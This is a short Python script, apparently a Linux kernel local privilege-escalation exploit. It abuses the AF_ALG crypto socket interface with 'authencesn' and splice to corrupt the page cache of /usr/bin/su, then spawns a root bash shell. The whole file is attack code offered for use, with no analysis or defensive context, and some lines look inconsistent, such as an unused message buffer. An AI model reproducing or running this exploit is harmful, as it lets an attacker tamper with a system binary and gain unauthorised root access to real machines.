#!/usr/bin/env python3
import os,ctypes,struct,socket,sys
from ctypes import c_int,c_ulong

SOL_ALG=279;AF_ALG=38
PAGE=4096;SU=b"/usr/bin/su"

def make_alg(typ,name,feat=0,mask=0):
    s=socket.socket(AF_ALG,socket.SOCK_SEQPACKET,0)
    s.bind(struct.pack("16sHHI64s",typ,feat,mask,0,name))
    return s

def splice(fd_in,fd_out,n):
    NR=275
    return ctypes.CDLL(None,use_errno=True).syscall(NR,fd_in,None,fd_out,None,n,0)

def pwn():
    aead=make_alg(b"aead",b"authencesn(hmac(sha1),cbc(aes))")
    aead.setsockopt(SOL_ALG,4,16)
    aead.setsockopt(SOL_ALG,2,b"\x00"*36)
    aead.setsockopt(SOL_ALG,3,b"\x00"*16)
    op,_=aead.accept()
    tfd=os.open(SU.decode(),os.O_RDONLY)
    pfd=os.pipe()
    splice(tfd,pfd[1],PAGE)
    # corrupt page cache
    iv=b"\x00"*16
    msg=struct.pack("II",2,len(iv))+iv
    op.sendmsg([b"\x00"*28],[( socket.SOL_SOCKET,socket.SCM_RIGHTS,struct.pack("i",pfd[1]))])
    op.sendmsg([b"\x00"*(16+20+4)],[])
    os.read(pfd[0],4)
    os.execlp("su","su","-c","id;exec bash")

pwn()
